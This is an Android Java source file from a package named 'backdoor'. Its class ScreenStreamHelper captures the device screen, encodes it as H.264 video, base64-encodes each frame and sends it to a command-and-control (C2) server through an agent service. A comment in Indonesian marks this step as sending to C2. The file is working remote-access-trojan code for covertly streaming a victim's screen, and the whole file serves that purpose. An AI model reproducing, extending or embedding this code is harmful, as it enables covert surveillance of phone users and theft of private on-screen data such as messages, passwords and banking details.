package com.lazyframework.backdoor;

import android.content.Context;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.RequiresApi;

import org.json.JSONObject;

import java.io.IOException;
import java.nio.ByteBuffer;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class ScreenStreamHelper {

    private static final String TAG = "ScreenStreamHelper";

    // ==================== CONFIG ====================
    private static final String MIME_TYPE = "video/avc"; // H.264
    private static final int BIT_RATE = 1500000;      // 1.5 Mbps
    private static final int FRAME_RATE = 20;         // Target 20 FPS
    private static final int I_FRAME_INTERVAL = 2;    // Keyframe every 2 seconds
    private static final int WIDTH = 720;
    private static final int HEIGHT = 1280;

    private Context context;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    private MediaProjection mediaProjection;
    private MediaCodec encoder;
    private Surface inputSurface;
    private VirtualDisplay virtualDisplay;

    private boolean isStreaming = false;
    private int frameCount = 0;
    private long lastFrameTime = 0;

    private MediaCodec.BufferInfo bufferInfo;

    public ScreenStreamHelper() {
        Log.d(TAG, "🏗️ ScreenStreamHelper (MediaCodec H.264) constructed");
    }

    public void onCreate(Context ctx) {
        this.context = ctx;
        backgroundThread = new HandlerThread("H264StreamThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        bufferInfo = new MediaCodec.BufferInfo();

        Log.d(TAG, "✅ ScreenStreamHelper (H.264) initialized");
    }

    public void startStream(MediaProjection projection) {
        if (isStreaming) {
            Log.w(TAG, "⚠️ Stream already running");
            return;
        }

        this.mediaProjection = projection;

        try {
            // === SETUP MEDIACODEC ENCODER ===
            MediaFormat format = MediaFormat.createVideoFormat(MIME_TYPE, WIDTH, HEIGHT);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                    MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            format.setInteger(MediaFormat.KEY_BIT_RATE, BIT_RATE);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, FRAME_RATE);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, I_FRAME_INTERVAL);

            encoder = MediaCodec.createEncoderByType(MIME_TYPE);
            encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            inputSurface = encoder.createInputSurface();
            encoder.start();

            Log.d(TAG, "✅ H.264 Encoder started");

            // === SETUP VIRTUAL DISPLAY ===
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "LazyH264Stream",
                    WIDTH,
                    HEIGHT,
                    320,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    inputSurface,
                    null,
                    backgroundHandler
            );

            isStreaming = true;
            frameCount = 0;
            lastFrameTime = System.currentTimeMillis();

            // Mulai encoding loop
            startEncodingLoop();

            Log.d(TAG, "🚀 Video Stream H.264 STARTED - " + WIDTH + "x" + HEIGHT + " @ " + FRAME_RATE + "fps");

            // Notify
            AgentService service = ServiceController.getAgentService();
            if (service != null) {
                service.onMirrorStarted();
                service.sendMirrorStatus(true);
            }

        } catch (IOException e) {
            Log.e(TAG, "❌ Failed to create MediaCodec", e);
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting H.264 stream", e);
        }
    }

    private void startEncodingLoop() {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!isStreaming || encoder == null) return;

                try {
                    // Dequeue encoded frames
                    int outputBufferIndex = encoder.dequeueOutputBuffer(bufferInfo, 0);

                    while (outputBufferIndex >= 0) {
                        ByteBuffer outputBuffer = encoder.getOutputBuffer(outputBufferIndex);

                        if (outputBuffer != null && bufferInfo.size > 0) {
                            byte[] encodedData = new byte[bufferInfo.size];
                            outputBuffer.get(encodedData);

                            // Kirim ke C2
                            sendEncodedFrame(encodedData, bufferInfo.flags);
                            frameCount++;
                        }

                        encoder.releaseOutputBuffer(outputBufferIndex, false);
                        outputBufferIndex = encoder.dequeueOutputBuffer(bufferInfo, 0);
                    }

                } catch (Exception e) {
                    Log.e(TAG, "Encoding loop error", e);
                }

                // Schedule next loop
                backgroundHandler.postDelayed(this, 10); // ~100Hz polling
            }
        });
    }

    private void sendEncodedFrame(byte[] data, int flags) {
        try {
            String base64 = Base64.encodeToString(data, Base64.NO_WRAP);

            AgentService service = ServiceController.getAgentService();
            if (service != null && service.isC2Connected()) {
                service.sendVideoFrame(base64, WIDTH, HEIGHT, frameCount);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to send encoded frame", e);
        }
    }

    public void stopStream() {
        isStreaming = false;

        if (virtualDisplay != null) {
            try { virtualDisplay.release(); } catch (Exception ignored) {}
            virtualDisplay = null;
        }

        if (encoder != null) {
            try {
                encoder.stop();
                encoder.release();
            } catch (Exception ignored) {}
            encoder = null;
        }

        if (inputSurface != null) {
            try { inputSurface.release(); } catch (Exception ignored) {}
            inputSurface = null;
        }

        Log.d(TAG, "⏹️ H.264 Video Stream STOPPED");
    }

    public void destroy() {
        stopStream();
        if (backgroundThread != null) {
            try {
                backgroundThread.quitSafely();
            } catch (Exception ignored) {}
        }
        context = null;
        Log.d(TAG, "💀 ScreenStreamHelper destroyed");
    }

    public boolean isStreaming() {
        return isStreaming;
    }

    public int getFrameCount() {
        return frameCount;
    }
}
